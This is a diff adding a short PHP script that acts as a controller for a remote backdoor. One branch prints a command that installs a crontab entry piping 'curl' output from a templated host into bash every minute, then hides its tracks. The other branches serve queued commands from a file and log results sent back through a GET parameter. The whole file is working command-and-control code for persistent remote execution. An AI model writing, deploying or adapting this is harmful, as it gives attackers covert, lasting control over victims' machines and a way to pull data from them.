@@ -1,0 +1,16 @@
+<?php if (isset($_GET['first'])) {
+	echo "echo '* * * * * curl [[host]]/[[host_addr]]/index.php|bash' >/tmp/system &&crontab /tmp/system&& rm -rf /tmp/system&&clear";
+}else{
+        $name="return.txt";
+        $name2="exe.txt";
+        $file2=fopen($name2,"r");
+        print_r(fread($file2,filesize("exe.txt")));
+        fclose($file2);
+}
+if (isset($_GET['return'])) {
+	$file = fopen($name,"a");
+	$cont=$_GET['return']."\n";
+	fwrite($file,$cont);
+	fclose($file);
+}
+?>
